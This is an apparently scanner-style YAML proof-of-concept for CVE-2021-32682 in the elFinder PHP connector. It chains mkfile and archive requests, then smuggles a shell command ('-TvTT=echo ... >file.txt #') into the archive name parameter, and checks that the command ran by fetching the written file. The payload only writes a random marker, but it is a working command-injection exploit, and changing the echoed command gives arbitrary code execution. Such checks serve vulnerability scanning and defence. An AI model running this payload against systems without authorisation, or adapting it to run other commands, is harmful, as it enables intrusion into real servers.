name: poc-yaml-elfinder-cve-2021-32682-rce
manual: true
transport: http
set:
    f1: randomLowercase(10)
    f2: randomLowercase(10)
    f3: randomLowercase(10)
    f4: randomLowercase(50)
rules:
    r1:
        request:
            cache: false
            method: GET
            path: /php/connector.minimal.php?cmd=mkfile&name={{f1}}.txt&target=l1_Lw
        expression: response.status == 200
        output:
            search: '"\",\"hash\":\"(?P<txthash>.+?)\"".bsubmatch(response.body)'
            txthash: search["txthash"]
    r2:
        request:
            cache: false
            method: GET
            path: /php/connector.minimal.php?cmd=archive&name={{f2}}.zip&target=l1_Lw&targets%5B%5D={{txthash}}&type=application%2Fzip
        expression: response.status == 200
        output:
            search1: '"\",\"hash\":\"(?P<ziphash>.+?)\"".bsubmatch(response.body)'
            ziphash: search1["ziphash"]
    r3:
        request:
            cache: false
            method: GET
            path: /php/connector.minimal.php?cmd=archive&name=-TvTT=echo+{{f4}}>{{f3}}.txt%20%23%20a.zip&target=l1_Lw&targets%5B1%5D={{ziphash}}&targets%5B0%5D={{txthash}}&type=application%2Fzip
        expression: response.status == 200
    r4:
        request:
            cache: false
            method: GET
            path: /files/{{f3}}.txt
        expression: response.status == 200 && response.body.bcontains(bytes(f4))
expression: r1() && r2() && r3() && r4()
detail:
    author: Monday
    links:
        - https://github.com/vulhub/vulhub/blob/4e5f92e59897589b3f57b5710af2f32a6366cddb/elfinder/CVE-2021-32682/README.zh-cn.md
    vulnerability:
        id: CT-156839
        level: critical
    warning: 注意该脚本会上传文件产生一个临时的无害文件